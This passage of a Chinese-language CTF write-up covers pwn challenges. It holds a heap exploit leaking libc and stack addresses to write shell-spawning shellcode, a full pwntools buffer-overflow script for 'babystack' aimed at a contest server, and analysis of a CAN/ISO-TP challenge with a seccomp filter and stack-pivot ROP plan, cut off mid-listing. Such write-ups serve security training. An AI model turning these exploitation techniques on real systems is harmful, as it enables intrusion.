+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t3</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t4</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>-</span> <span class=mh>0x150</span>
+</span></span><span class=line><span class=cl><span class=n>t4</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>-</span> <span class=mh>0x218</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t4</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;7&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1c0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#target = heap_base + 0x1c0</span>
+</span></span><span class=line><span class=cl><span class=c1>#add(4,0x80)</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay = p64(target+8)</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;/bin/sh\x00&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay += p64(target+8)</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay += p64(libc.sym[&#39;system&#39;])</span>
+</span></span><span class=line><span class=cl><span class=c1>#edit(4,pay)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>##pay  = b&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>##pay += p64(target)</span>
+</span></span><span class=line><span class=cl><span class=c1>##pay += asm(shellcraft.sh())</span>
+</span></span><span class=line><span class=cl><span class=c1>##edit(0,pay)</span>
+</span></span><span class=line><span class=cl><span class=c1>##print(n)</span>
+</span></span><span class=line><span class=cl><span class=c1>##pause()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#add(4,0x78)</span>
+</span></span><span class=line><span class=cl><span class=c1>#add(5,0x78)</span>
+</span></span><span class=line><span class=cl><span class=c1>#rm(4)</span>
+</span></span><span class=line><span class=cl><span class=c1>#rm(5)</span>
+</span></span><span class=line><span class=cl><span class=c1>#edit</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#rm(0)</span>
+</span></span><span class=line><span class=cl><span class=c1>#rm(1)</span>
+</span></span><span class=line><span class=cl><span class=c1>#show(0)</span>
+</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;Data: &#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#key = uu64(r(6))</span>
+</span></span><span class=line><span class=cl><span class=c1>#heap_base = key &lt;&lt; 0xC</span>
+</span></span><span class=line><span class=cl><span class=c1>#lss(&#39;heap_base&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=babystack>babystack</h2><p>程序逻辑如下，可以通过第二次输入将n180097847覆盖，然后直接getshell</p><p><img src=https://su-team.cn/img/2025-QWNT/49.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=s1>&#39;./babystack&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=n>choice</span> <span class=o>=</span> <span class=mh>0x001</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-11b07bf3af.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sa</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span>     <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>itr</span>     <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>uu32</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u32</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uu64</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uru64</span>   <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:])</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span>               <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>name</span><span class=p>))))</span>
+</span></span><span class=line><span class=cl><span class=n>libc_os</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                <span class=p>:</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>x</span>
+</span></span><span class=line><span class=cl><span class=n>clear</span>       <span class=o>=</span>       <span class=k>lambda</span>                            <span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;clear&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_sb</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span>  
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Enter your flag1:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>debug</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Enter your flag2:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x108</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1337abc</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=车联网>车联网</h1><h2 id=can>Can</h2><p>沙箱</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-YAML data-lang=YAML><span class=line><span class=cl><span class=w> </span><span class=l>line  CODE  JT   JF      K</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>=================================</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0000</span><span class=p>:</span><span class=w> </span><span class=m>0x20</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000004</span><span class=w>  </span><span class=l>A = arch</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0001</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0xc000003e</span><span class=w>  </span><span class=l>if (A != ARCH_X86_64) goto 0008</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0002</span><span class=p>:</span><span class=w> </span><span class=m>0x20</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000000</span><span class=w>  </span><span class=l>A = sys_number</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0003</span><span class=p>:</span><span class=w> </span><span class=m>0x35</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x01</span><span class=w> </span><span class=m>0x40000000</span><span class=w>  </span><span class=l>if (A &lt; 0x40000000) goto 0005</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0004</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x03</span><span class=w> </span><span class=m>0xffffffff</span><span class=w>  </span><span class=l>if (A != 0xffffffff) goto 0008</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0005</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x02</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x0000003b</span><span class=w>  </span><span class=l>if (A == execve) goto 0008</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0006</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x01</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000142</span><span class=w>  </span><span class=l>if (A == execveat) goto 0008</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0007</span><span class=p>:</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x7fff0000</span><span class=w>  </span><span class=l>return ALLOW</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0008</span><span class=p>:</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000000</span><span class=w>  </span><span class=l>return KILL</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>大概分析一下逻辑，先是一个密码</p><p><img src=https://su-team.cn/img/2025-QWNT/50.png alt=img></p><p>然后可以输入指令，但这上面这几个指令都没什么用。主要是下面的逻辑，我们可以发送3种类型的 ISO-TP 帧</p><ul><li>SF - 单帧</li><li>FF - 首帧<ul><li>输入<code>1#10xxxx</code></li></ul></li><li>CF - 连续帧<ul><li>连续输入 <code>1#21...</code>、<code>1#22...</code>、<code>1#23...</code> 到了f就再回到1</li></ul></li></ul><p>大概尝试了一下，可以利用处理 CF 帧的这个 if 判断来泄露 pie</p><p><img src=https://su-team.cn/img/2025-QWNT/51.png alt=img></p><p>没细看处理的逻辑，但大概尝试了一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Enter magic number:\n&#39;</span><span class=p>,</span><span class=s1>&#39;12803159&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#1020414141414141&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2142424242424242&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2243434343434343&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2344444444444444&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>就能执行到这个else分支，应该是输入的 CF 帧不合法导致的</p><p>值得注意的是这个函数</p><p><img src=https://su-team.cn/img/2025-QWNT/52.png alt=img></p><p>memcpy没有对长度进行判断，当满足条件的时候就会执行下面这个 p_sub_16E0, 存放在 buf_ + 0x100 的位置</p><p><img src=https://su-team.cn/img/2025-QWNT/53.png alt=img></p><p>可以先发送一个 FF 帧，例如：发送 <code>1#1008...</code>, 发这个帧是为了设定 ::n 的大小 , 由1#1后面的三个数字来决定，这个例子中 ::n 会被设定为 8。</p><p>泄露出 pie_base 之后需要重新设置 FF 帧，把ret写到开头，接着就利用 CF 帧的memcpy布置rop链来泄露libc。这里rop链的结构是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>ret</span>
+</span></span><span class=line><span class=cl><span class=n>puts</span><span class=p>(</span><span class=n>fgets_got</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rbp_ret</span>
+</span></span><span class=line><span class=cl><span class=n>bss_addr</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000130</span><span class=n>F</span>                 <span class=n>mov</span>     <span class=n>rdx</span><span class=p>,</span> <span class=n>cs</span><span class=p>:</span><span class=n>stdin</span>   <span class=p>;</span> <span class=n>stream</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>0000000000001316</span>                 <span class=n>mov</span>     <span class=n>esi</span><span class=p>,</span> <span class=mi>200</span><span class=n>h</span>       <span class=p>;</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000131</span><span class=n>B</span>                 <span class=n>mov</span>     <span class=n>rdi</span><span class=p>,</span> <span class=n>rbp</span>        <span class=p>;</span> <span class=n>s</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000131</span><span class=n>E</span>                 <span class=n>call</span>    <span class=n>_fgets</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后我们把 p_sub_16E0 覆盖成这个gadget <code>push rdi ; pop rsp ; ret</code>。因为执行 p_sub_16E0 之前寄存器的状态是这样的</p><p><img src=https://su-team.cn/img/2025-QWNT/54.png alt=img></p><p>用这个gadget就能把栈迁移到bss段上，最后通过fgets的溢出来布置orw的rop链即可</p><p>大概泄露了一下远程的libc</p><p><img src=https://su-team.cn/img/2025-QWNT/55.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
